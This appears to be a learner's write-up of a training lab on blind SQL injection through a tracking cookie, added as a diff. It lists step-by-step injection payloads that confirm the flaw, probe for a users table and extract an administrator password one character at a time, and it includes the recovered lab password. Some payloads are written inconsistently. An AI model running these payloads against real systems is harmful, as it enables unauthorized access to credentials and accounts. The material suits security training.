@@ -1,0 +1,84 @@
+LAB 11: Blind SQL injection with conditional responses
+
+VULNERABLE CATEGORY: Tracking cookie
+
+End Goals: 
+1. Enumerate the password of administrator
+2. Login as the administrator user
+
+FIRST THING TO DO WHILE TESTING FOR BLIND SQLI:
+1. Force the true use case and false use case and see how the application respond, if they respond differenlty according to true use case and the false use case then we can exploit the blind SQLI.
+
+Analysis:
+1. Confirm that the parameter is vulnerable to blind sqli:
+The query would looks like in backend: SELECT tracking-id FROM tracking-table WHERE trackingId='JEPHmZthsOLuvuWt';
+--> If this trackingId exist--> qyery returns value--> and we get Welcome Back! message
+--> If this trackingId doesnot exist-> query didnot returns value --> and then we got no message
+
+2. Now, to cofirm there is blind sqli we have to enforce the true use case and that should give Welcome Back! message and we will enforce the false use case as well but that will didnot give us the Welcome Back! message.
+
+3. For true use case:
+   SELECT tracking-id FROM tracking-table WHERE trackingId='JEPHmZthsOLuvuWt' AND 1=1--';
+   So, our payload is--> ' AND 1=1-- --> let's see how this behaves--> yes it does gives me welcome back message
+
+4. For false use case:
+        SELECT tracking-id FROM tracking-table WHERE trackingId='JEPHmZthsOLuvuWt' AND 1=2--';
+        So, our payload is: ' AND 1=2-- --> lets see how this behaves --> there is no welcome back message
+
+5. Since, this is blind sqli we will gonna ask the application does the user table exist or not?
+  --> If we get Welcome Back! message then it exist
+  --> If it doesnot get Welcome Back! message it doesnot exist      
+  SELECT tracking-id FROM tracking-table WHERE trackingId='JEPHmZthsOLuvuWt' AND (SELECT 'x' FROM users LIMIT 1)='x'--';  
+  SO, our payload is: ' AND (SELECT 'x' FROM users LIMIT 1)='x'-- => what this does it: if there is a user table output the value x for each entry but we limit it to 1 and check if that equals to x, if does equal then we get the Welcome Back! message this means we have the users table if not then there is no users table.
+  ***SELECT any random value let's say 'x' from the users table and limit the entry to only 1 and check that equals to x.
+  *** ' AND (SELECT 'x' FROM users LIMIT 1)="x"-- ==> this successfully gives me Welcome Back! message so there does exist users table.
+  *** Let's check for passwords table as well:
+   ' AND (SELECT 'x' FROM passwords LIMIT 1)='x'-- ==> No, Welcome Back! shown
+   ' AND (SELECT 'x' FROM password LIMIT 1)='x'--
+
+6. Confirm the username administrator exist in the database: 
+   SELECT tracking-id FROM tracking-table WHERE trackingId='JEPHmZthsOLuvuWt' AND (SELECT username FROM users WHERE username='administrator')='administrator'--';
+   So, our payload is: ' AND (SELECT username FROM users WHERE username='administrator')='administrator'-- ==> yes, our username administrator does exist
+
+7. Enumerate the password of the administrator user
+   *** If we direct Enumerate the administrator password it is same like the bruteforcing the password, so we will first try to know the length of the password and then we wil bruteforce through the burpsuite.
+   *** SELECT tracking-id FROM tracking-table WHERE trackingId='JEPHmZthsOLuvuWt' AND (SELECT username,password FROM users WHERE username='administrator' AND LENGTH(password)>1)='administrator'--';
+   So, my payload is: ' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>=1)='administrator'-- ==> so the password is 20 character long.
+
+ 7A. We have to enumerate the password for this time
+   check-for 'a'==> if welcome back shows it starts with a else not
+   check -for ;b'==> if welcome back shows it starts with b else not
+   check-for 'ab'==> if welcome back shows it starts with ab else not
+
+   SELECT tracking-id FROM tracking-table WHERE trackingId='JEPHmZthsOLuvuWt' AND (SELECT substring(password,1,1) FROM users WHERE username="administrator")='a'--';
+   so our paylod is: ' AND (SELECT substring(password,1,1) FROM users WHERE username='administrator')='a'--
+   --> so this my password start with '4' , now I will go for 2 character password hai 
+    so our payload is: ' AND (SELECT substring(password,2,1) FROM users WHERE username='administrator')='4a'--
+
+8. I found the password by attacking the bruteforce(clusterbomb attack), the result are as follow:
+   *** 17= e
+       3= m   
+       8= o
+       12= o
+       10= p
+       6= q
+       4= r
+       15= r
+       2= u
+       7= u
+       5= v
+       11= x
+       20= x
+       9= z
+       18= 3
+       1= 4
+       13= 6
+       14= 6
+       19= 7
+       4= r
+       16= h
+so the password is: 4umrvquozpxo66rhe37x
+
+lets script in python
+
+     
